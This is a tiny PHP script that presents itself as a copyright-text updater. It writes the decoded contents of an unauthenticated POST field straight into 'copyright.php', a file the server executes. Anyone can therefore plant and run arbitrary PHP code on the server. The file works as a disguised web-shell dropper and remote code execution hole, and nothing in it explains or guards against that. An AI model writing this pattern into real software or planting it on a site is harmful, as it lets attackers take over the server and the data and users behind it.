<?php
$copyright_content = urldecode($_POST['copyright_content']);
file_put_contents('copyright.php', html_entity_decode($copyright_content));
?>
